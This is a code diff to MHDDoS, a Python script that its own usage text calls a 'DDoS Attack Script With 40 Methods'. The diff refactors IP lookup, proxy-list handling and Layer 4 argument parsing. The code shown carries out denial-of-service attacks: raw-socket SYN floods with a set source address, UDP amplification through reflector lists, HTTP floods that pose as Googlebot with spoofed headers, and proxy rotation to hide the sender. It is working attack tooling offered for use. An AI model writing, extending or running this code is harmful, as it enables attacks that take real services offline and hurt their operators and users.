@@ -20,18 +20,18 @@ from subprocess import run
 from sys import argv
 from sys import exit as _exit
 from threading import Event, Lock, Thread
-from urllib import parse
 from time import sleep, time
 from typing import Any, List, Set, Tuple
+from urllib import parse
 
 import dns.resolver
+from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
+from PyRoxy import Tools as ProxyTools
 from certifi import where
 from cfscrape import create_scraper
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
-from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
-from PyRoxy import Tools as ProxyTools
 from requests import Response, Session, exceptions, get
 from yarl import URL
 
@@ -43,9 +43,28 @@ ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
-__version__ = "2.3 SNAPSHOT"
-__dir__ = Path(__file__).parent
-__ip__ = get('https://api.my-ip.io/ip').text
+__version__: str = "2.3 SNAPSHOT"
+__dir__: Path = Path(__file__).parent
+__ip__: Any = None
+
+
+def getMyIPAddress():
+    global __ip__
+    if __ip__:
+        return __ip__
+    with suppress(Exception):
+        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
+    with suppress(Exception):
+        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
+    with suppress(Exception):
+        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
+    with suppress(Exception):
+        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
+    with suppress(Exception):
+        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
+    with suppress(Exception):
+        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
+    return getMyIPAddress()
 
 
 def exit(*message):
@@ -124,7 +143,7 @@ class Tools:
         suffixes = ['', 'k', 'm', 'g', 't', 'p']
         if num > 999:
             obje = sum(
-                [abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
+                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
             return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
         else:
             return num
@@ -262,8 +281,7 @@ class Layer4(Thread):
         global bytes_sent, REQUESTS_SENT
         payload = self._genrate_syn()
         try:
-            with self.get_effective_socket(AF_INET, SOCK_RAW,
-                                           IPPROTO_TCP) as s:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(payload, self._target):
                     REQUESTS_SENT += 1
@@ -276,7 +294,7 @@ class Layer4(Thread):
         global bytes_sent, REQUESTS_SENT
         payload = next(self._amp_payloads)
         try:
-            with self.get_effective_socket(AF_INET, SOCK_RAW,
+            with socket(AF_INET, SOCK_RAW,
                                            IPPROTO_UDP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
@@ -301,7 +319,7 @@ class Layer4(Thread):
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(__ip__)
+        ip.set_ip_src(getMyIPAddress())
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
@@ -388,7 +406,7 @@ class HttpFlood(Thread):
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                       target.raw_path_qs,randchoice(['1.0','1.1','1.2']))
+                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -458,7 +476,7 @@ class HttpFlood(Thread):
     def getMethodType(method: str) -> str:
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
                                             "STRESS", "DYN", "SLOW", "PPS", "APACHE",
-                                                                            "BOT",} \
+                                            "BOT", } \
             else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
@@ -582,16 +600,16 @@ class HttpFlood(Thread):
             "Accept: text/plain,text/html,*/*\r\n"
             "User-Agent: %s\r\n" % randchoice(google_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
-                "GET /sitemap.xml HTTP/1.1\r\n"
-                "Host: %s\r\n" % self._target.raw_authority +
-                "Connection: Keep-Alive\r\n"
-                "Accept: */*\r\n"
-                "From: googlebot(at)googlebot.com\r\n"
-                "User-Agent: %s\r\n" % randchoice(google_agents) +
-                "Accept-Encoding: gzip,deflate,br\r\n"
-                "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
-                                              ProxyTools.Random.rand_str(4)) +
-                "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
+            "GET /sitemap.xml HTTP/1.1\r\n"
+            "Host: %s\r\n" % self._target.raw_authority +
+            "Connection: Keep-Alive\r\n"
+            "Accept: */*\r\n"
+            "From: googlebot(at)googlebot.com\r\n"
+            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "Accept-Encoding: gzip,deflate,br\r\n"
+            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
+                                          ProxyTools.Random.rand_str(4)) +
+            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
         try:
             with self.open_connection() as s:
                 s.send(p1)
@@ -740,16 +758,16 @@ class HttpFlood(Thread):
                                                 self._target.raw_path_qs,
                                                 ProxyTools.Random.rand_str(6))
         payload = (payload + 'Accept-Encoding: gzip, deflate, br\r\n'
-                   'Accept-Language: en-US,en;q=0.9\r\n'
-                   'Cache-Control: max-age=0\r\n'
-                   'Connection: Keep-Alive\r\n'
-                   'Sec-Fetch-Dest: document\r\n'
-                   'Sec-Fetch-Mode: navigate\r\n'
-                   'Sec-Fetch-Site: none\r\n'
-                   'Sec-Fetch-User: ?1\r\n'
-                   'Sec-Gpc: 1\r\n'
-                   'Pragma: no-cache\r\n'
-                   'Upgrade-Insecure-Requests: 1\r\n')
+                             'Accept-Language: en-US,en;q=0.9\r\n'
+                             'Cache-Control: max-age=0\r\n'
+                             'Connection: Keep-Alive\r\n'
+                             'Sec-Fetch-Dest: document\r\n'
+                             'Sec-Fetch-Mode: navigate\r\n'
+                             'Sec-Fetch-Site: none\r\n'
+                             'Sec-Fetch-User: ?1\r\n'
+                             'Sec-Gpc: 1\r\n'
+                             'Pragma: no-cache\r\n'
+                             'Upgrade-Insecure-Requests: 1\r\n')
         payload += "Host: %s\r\n" % self._target.authority
         payload += self.randHeadercontent
         payload += self.SpoofIP
@@ -833,8 +851,8 @@ class HttpFlood(Thread):
         if name == "PPS":
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (
-                self._defaultpayload +
-                "Host: %s\r\n\r\n" % self._target.authority).encode()
+                    self._defaultpayload +
+                    "Host: %s\r\n\r\n" % self._target.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
 
@@ -991,7 +1009,7 @@ class ToolsConsole:
                             print(('status_code: %d\n'
                                    'status: %s') %
                                   (r.status_code, "ONLINE"
-                                   if r.status_code <= 500 else "OFFLINE"))
+                                  if r.status_code <= 500 else "OFFLINE"))
                             return
                     print("Error!")
 
@@ -1092,39 +1110,41 @@ class ToolsConsole:
     @staticmethod
     def usage():
         print((
-            '* Coded By MH_ProDev For Better Stresser\n'
-            'Note: If the Proxy list is empty, the attack will run without proxies\n'
-            '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
-            '      Proxy Type 0 = All in config.json\n'
-            ' Layer7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
-            ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <proxylist> <socks_type> <reflector file (only use with '
-            'Amplification)>\n'
-            '\n'
-            ' > Methods:\n'
-            ' - Layer4\n'
-            ' | %s | %d Methods\n'
-            ' - Layer7\n'
-            ' | %s | %d Methods\n'
-            ' - Tools\n'
-            ' | %s | %d Methods\n'
-            ' - Others\n'
-            ' | %s | %d Methods\n'
-            ' - All %d Methods\n'
-            '\n'
-            'Example:\n'
-            '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
-            '    Layer4: python3 %s %s %s %s %s proxy.txt %s') %
-              (argv[0], argv[0], ", ".join(Methods.LAYER4_METHODS),
-               len(Methods.LAYER4_METHODS), ", ".join(Methods.LAYER7_METHODS),
-               len(Methods.LAYER7_METHODS), ", ".join(ToolsConsole.METHODS),
-               len(ToolsConsole.METHODS), ", ".join(["TOOLS", "HELP", "STOP"]),
-               3, len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
-               argv[0], randchoice([*Methods.LAYER7_METHODS]),
-               "https://example.com", randchoice([4, 5, 1, 0]),
-               randint(850, 1000), randint(50, 100), randint(
-                   1000, 3600), argv[0], randchoice([*Methods.LAYER4_METHODS]),
-               "8.8.8.8:80", randint(850, 1000), randint(1000, 3600), randchoice([4, 5, 1, 0])))
+                  '* MHDDoS - DDoS Attack Script With 40 Methods\n'
+                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
+                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
+                  '      Proxy Type 0 = All in config.json\n'
+                  '      SocksTypes:\n'
+                  '         - 6 = RANDOM\n'
+                  '         - 5 = SOCKS5\n'
+                  '         - 4 = SOCKS4\n'
+                  '         - 1 = HTTP\n'
+                  '         - 0 = ALL\n'
+                  ' > Methods:\n'
+                  ' - Layer4\n'
+                  ' | %s | %d Methods\n'
+                  ' - Layer7\n'
+                  ' | %s | %d Methods\n'
+                  ' - Tools\n'
+                  ' | %s | %d Methods\n'
+                  ' - Others\n'
+                  ' | %s | %d Methods\n'
+                  ' - All %d Methods\n'
+                  '\n'
+                  'Example:\n'
+                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
+                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
+                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
+                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
+                  ' Amplification)>\n') %
+              (", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
+               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
+               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
+               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
+               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
+               argv[0], argv[0], argv[0], argv[0]))
 
+    # noinspection PyBroadException
     @staticmethod
     def ts_srv(domain):
         records = ['_ts3._udp.', '_tsdns._tcp.']
@@ -1141,7 +1161,7 @@ class ToolsConsole:
             except:
                 Info[rec] = 'Not found'
 
-        return (Info)
+        return Info
 
     # noinspection PyUnreachableCode
     @staticmethod
@@ -1152,7 +1172,11 @@ class ToolsConsole:
         return {"success": False}
 
 
-def get_proxies(proxy_li):
+def handleProxyList(con, proxy_li, proxy_ty):
+    if proxy_ty not in {4, 5, 1, 0, 6}:
+        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
+    if proxy_ty == 6:
+        proxy_ty = randchoice([4, 5, 1])
     if not proxy_li.exists():
         logger.warning("The file doesn't exist, creating files and downloading proxies.")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
@@ -1163,7 +1187,7 @@ def get_proxies(proxy_li):
             )
             Proxies = ProxyChecker.checkAll(
                 Proxies, timeout=1, threads=threads,
-                **({'url': url.human_repr()} if url else {})
+                **({'url': url.human_repr()} if url else {"url:": "https://httpbin.org/get"})
             )
             if not Proxies:
                 exit(
@@ -1194,11 +1218,11 @@ if __name__ == '__main__':
                 one = argv[1].upper()
 
                 if one == "HELP":
-                 raise IndexError()
+                    raise IndexError()
                 if one == "TOOLS":
-                 ToolsConsole.runConsole()
+                    ToolsConsole.runConsole()
                 if one == "STOP":
-                 ToolsConsole.stop()
+                    ToolsConsole.stop()
 
                 method = one
                 host = None
@@ -1206,15 +1230,15 @@ if __name__ == '__main__':
                 event = Event()
                 event.clear()
                 target = None
+                urlraw = argv[2].strip()
+                if not urlraw.startswith("http"):
+                    urlraw = "http://" + urlraw
 
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" %
                          ", ".join(Methods.ALL_METHODS))
 
                 if method in Methods.LAYER7_METHODS:
-                    urlraw = argv[2].strip()
-                    if not urlraw.startswith("http"):
-                        urlraw = "http://" + urlraw
                     url = URL(urlraw)
                     host = url.host
                     try:
@@ -1247,61 +1271,69 @@ if __name__ == '__main__':
                     if not uagents: exit("Empty Useragent File ")
                     if not referers: exit("Empty Referer File ")
 
-                    if proxy_ty not in {4, 5, 1, 0}:
-                        exit("Socks Type Not Found [4, 5, 1, 0]")
                     if threads > 1000:
                         logger.warning("Thread is higher than 1000")
                     if rpc > 100:
                         logger.warning(
                             "RPC (Request Pre Connection) is higher than 100")
 
-                    proxies = get_proxies(proxy_li)
+                    proxies = handleProxyList(con, proxy_li, proxy_ty)
                     for _ in range(threads):
                         HttpFlood(url, host, method, rpc, event, uagents,
                                   referers, proxies).start()
 
                 if method in Methods.LAYER4_METHODS:
-                    target = argv[2].strip()
-                    if ":" in target and not target.split(":")[1].isnumeric():
-                        exit("Invalid Port Number")
-                    port = 53 if ":" not in target else int(
-                        target.split(":")[1])
-                    threads = int(argv[3])
-                    timer = int(argv[4])
-                    ref = None
+                    target = URL(urlraw)
 
-                    if ":" not in target:
-                        logger.warning("Port Not Selected, Set To Default: 80")
-                    else:
-                        target = target.split(":")[0]
-                    proxy_ty = int(argv[6].strip())
-                    proxy_li = Path(__dir__ / "files/proxies/" /
-                                    argv[5].strip())
+                    port = target.port
+                    target = target.host
+
+                    try:
+                        target = gethostbyname(target)
+                    except Exception as e:
+                        exit('Cannot resolve hostname ', url.host, e)
 
                     if port > 65535 or port < 1:
                         exit("Invalid Port [Min: 1 / Max: 65535] ")
-                    if not ProxyTools.Patterns.IP.match(target):
-                        exit("Invalid Ip Selected")
+
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                             not ToolsConsole.checkRawSocket():
-                        exit("Cannot Create Raw Socket ")
+                        exit("Cannot Create Raw Socket")
 
-                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
-                        if len(argv) >= 6:
-                            if len(argv) == 7:
+                    threads = int(argv[3])
+                    timer = int(argv[4])
+                    ref = None
+                    if not port:
+                        logger.warning("Port Not Selected, Set To Default: 80")
+                        port = 80
+
+
+                    if len(argv) >= 6:
+                        argfive = argv[5].strip()
+                        if argfive:
+                            refl_li = Path(__dir__ / "files/proxies/" / argfive)
+                            if refl_li.exists():
+                                if method not in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
+                                    exit("this method cannot use for amplification")
+                                ref = set(a.strip()
+                                          for a in ProxyTools.Patterns.IP.findall(
+                                    refl_li.open("r+").read()))
+                                if not ref: exit("Empty Reflector File ")
+                                if len(argv) == 7:
+                                    logger.setLevel("DEBUG")
+
+                            elif argfive.isdigit() and len(argv) >= 7:
+                                proxy_ty = int(proxy_ty)
+                                proxy_li = Path(__dir__ / "files/proxies/" / argv[6].strip())
+                                proxies = handleProxyList(con, proxy_li, proxy_ty)
+                                if method not in {"MINECRAFT", "TCP"}:
+                                    exit("this method cannot use for layer4 proxy")
+                                if len(argv) == 8:
+                                    logger.setLevel("DEBUG")
+
+                            elif len(argv) == 5:
                                 logger.setLevel("DEBUG")
-                            refl_li = Path(__dir__ / "files" / argv[5].strip())
-                            if not refl_li.exists():
-                                exit("The Reflector file doesn't exist ")
-                            ref = set(a.strip()
-                                      for a in ProxyTools.Patterns.IP.findall(
-                                          refl_li.open("r+").read()))
-                        if not ref: exit("Empty Reflector File ")
-                    else:
-                        if len(argv) == 7:
-                            logger.setLevel("DEBUG")
 
-                    proxies = get_proxies(proxy_li)
                     for _ in range(threads):
                         Layer4((target, port), ref, method, event,
                                proxies).start()
